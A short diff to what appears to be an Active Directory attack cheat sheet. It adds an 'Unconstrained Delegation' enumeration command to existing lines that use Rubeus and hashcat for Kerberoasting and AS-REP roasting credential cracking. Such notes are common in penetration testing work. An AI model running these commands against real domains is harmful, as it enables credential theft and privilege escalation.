@@ -9,3 +9,7 @@ hashcat -a 0 -m 13100 kerberoast-hashes /usr/share/wordlists/rockyou.txt
 PowerShell Get-DomainUser -PreauthNotRequired -Properties SamAccountName
 Rubeus asreproast
 hashcat -a 0 -m 18200 kerberoast-hashes /usr/share/wordlists/rockyou.txt
+
+#Unconstrained Delegation
+PowerShell Get-DomainComputer -Unconstrained -Properties DnsHostName
+
